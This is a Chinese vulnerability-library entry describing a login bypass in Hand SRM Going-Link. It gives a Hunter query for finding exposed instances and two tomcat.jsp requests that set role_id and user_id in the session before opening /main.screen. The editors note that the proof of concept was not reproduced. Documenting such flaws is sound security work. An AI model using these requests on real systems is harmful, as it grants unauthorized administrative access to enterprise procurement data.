---
source: "wy876 漏洞文库"
title: "汉得SRM Going-Link tomcat.jsp会话字段认证绕过"
product: "汉得SRM Going-Link"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "未认证入口但需要同一session两步"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/kb4n0lalk008g50l"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%B1%89%E5%BE%97SRMtomcat.jsp%E7%99%BB%E5%BD%95/%E6%B1%89%E5%BE%97SRMtomcat.jsp%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"汉得 SRM Going-Link\""
id: "vw-90f3f89a60bdc08df85c9acf"
entity_id: "ve-90f3f89a60bdc08df85c9acf"
schema_version: "1"
---

# 汉得SRM Going-Link tomcat.jsp会话字段认证绕过

## 条目说明

- 对象与具体问题：汉得SRM Going-Link；tomcat.jsp会话字段认证绕过
- 版本、配置及部署条件：无版本
- 认证与权限前提：未认证入口但需要同一session两步
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- tomct.jsp正文笔误与tomcat路由不一致；后台URL混font标签
- 需说明两请求保持同session、角色/user值对应关系，缺返回证据
- Hunter误抽fofa/残缺，修复版本与根因缺失

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
汉得SRM云是面向企业采购流程信息化建设的完整解决方案。基于汉得供应商关系管理体系在战略寻源与集中采购、供应链协同和优益采购三大采购管理领域的成功实践，形成了深度契合业务实体的三项组件级解决方案。汉得SRM tomcat.jsp 存在登录绕过漏洞，可绕过身份认证登录后台。

## 二、影响版本
+ 汉得 SRM云平台（Going-Link）

## 三、资产测绘
+ hunter：`app.name="汉得 SRM Going-Link"`


+ 登录页面


## 四、漏洞复现
1. 访问`tomct.jsp`

```java
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```


2. 然后访问后台`/main.screen`


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kb4n0lalk008g50l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
